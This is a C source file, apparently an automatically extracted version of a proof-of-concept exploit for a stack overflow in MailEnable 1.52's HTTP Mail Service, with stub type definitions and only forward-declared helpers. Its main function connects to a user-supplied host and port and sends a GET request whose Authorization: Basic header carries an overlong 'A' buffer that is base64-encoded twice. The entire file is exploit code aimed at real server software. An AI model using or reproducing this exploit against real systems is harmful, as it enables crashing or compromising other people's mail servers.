#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  char uint8_t ;
typedef  int /*<<< orphan*/  uint16_t ;
struct TYPE_2__ {int /*<<< orphan*/  s_addr; } ;
struct sockaddr_in {TYPE_1__ sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
typedef  int /*<<< orphan*/  peer ;
typedef  int /*<<< orphan*/  path ;
typedef  int /*<<< orphan*/  WSADATA ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int BOF1SZ ; 
 int BUFFSZ ; 
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  MAKEWORD (int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  Menuu (int,char**) ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  WSAStartup (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  args (int,char**) ; 
 int /*<<< orphan*/  atoi (char*) ; 
 char* base64_encode (char*,int*) ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ connect (int,struct sockaddr*,int) ; 
 int doit (int,char**) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fletcher32 (char*,int) ; 
 int /*<<< orphan*/  fputs (char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  get_executable_path (char*,int) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 char* inet_ntoa (TYPE_1__) ; 
 int /*<<< orphan*/  ntohs (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  putcc (char*,char,int) ; 
 int /*<<< orphan*/  recv (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  resolv (char*) ; 
 int /*<<< orphan*/  send (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  setbuf (int /*<<< orphan*/ ,int /*<<< orphan*/ *) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int sprintf (char*,char*,char*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  timeout (int,int) ; 

int main(int argc, char *argv[]) {
    char path[1000];
    struct  sockaddr_in peer;
    int     sd,
           len,
           attack;
    uint16_t     port;
    uint8_t      buff[BUFFSZ],
           *b64;
    int a;
    printf("*******************************************************************************\n");
    printf("MailEnable 1.52 HTTP Mail Service Stack Overflow POC Exploit(encoded comand)\n");
    printf("\tCredits:fl0 fl0w\n");
    Menuu(argc, argv);
    printf("*******************************************************************************\n");
    a = doit(argc, argv);             
    #ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
    #endif
    setbuf(stdout, NULL);
    fputs("\n"
        "\n", stdout);
    if(argc < 3) {
        printf("\n"
        "Usage: %s option host option port\n"
        "\n", argv[0]);
        exit(1);
    }
    args(argc, argv);
    if(argc > 3) port = atoi(argv[4]);
    get_executable_path (path, sizeof (path));
    printf ("this program is in the directory %s\n", path);
    peer.sin_addr.s_addr = resolv(argv[2]);
    peer.sin_port        = htons(port);
    peer.sin_family      = AF_INET;
    printf("- target   %s : %hu\n", inet_ntoa(peer.sin_addr), ntohs(peer.sin_port));
    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if(sd < 0) exit(0);
    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer))< 0) exit(0);
    len = BOF1SZ;
    putcc(buff, 'A', len);
    b64 = base64_encode(buff, &len);
    b64 = base64_encode(b64, &len);
    len = sprintf(buff,"GET / HTTP/1.0\r\n""Authorization: Basic %s\r\n""\r\n", b64);
    fletcher32(buff,len);    
    send(sd, buff, len, 0);
    if(!timeout(sd, 5)) recv(sd, buff, BUFFSZ, 0);
    close(sd);
    printf("- done\n");
    return(0);
    }